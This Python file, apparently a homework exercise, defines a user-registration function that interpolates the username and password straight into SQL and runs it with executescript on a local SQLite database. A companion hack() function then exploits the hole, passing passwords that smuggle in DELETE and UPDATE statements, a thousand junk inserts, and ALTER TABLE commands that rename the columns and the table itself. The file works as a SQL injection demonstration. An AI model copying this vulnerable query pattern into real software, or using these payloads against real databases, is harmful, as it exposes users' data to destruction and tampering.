import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    delete_update_request = """
    DELETE FROM table_users
        WHERE id < 50;
     UPDATE table_users
        SET username = 'НЕВЕРНОЕ_ИМЯ'
    """

    username: str = "I like"
    password: str = f"""it_is_password'); {delete_update_request} --"""
    register(username, password)

    add_new_data_request = ''

    for _ in range(1000):
        temp_str = """INSERT INTO table_users(username, password)
                        VALUES ('ИМЕНИ НЕТ', 'ПАРОЛЯ НЕТ'); 
                    """
        add_new_data_request += temp_str

    username: str = "I like"
    password: str = f"it_is_password'); {add_new_data_request} -- "
    register(username, password)

    change_table_request = """
    ALTER TABLE table_users
    RENAME COLUMN username TO cracked_name;
    ALTER TABLE table_users
    RENAME COLUMN password TO lastword;
    ALTER TABLE table_users
    ADD COLUMN dont_do_again VARCHAR(255);
    ALTER TABLE table_users
    RENAME TO cracked;
    """

    username: str = "I like"
    password: str = f"it_is_password'); {change_table_request} -- "
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
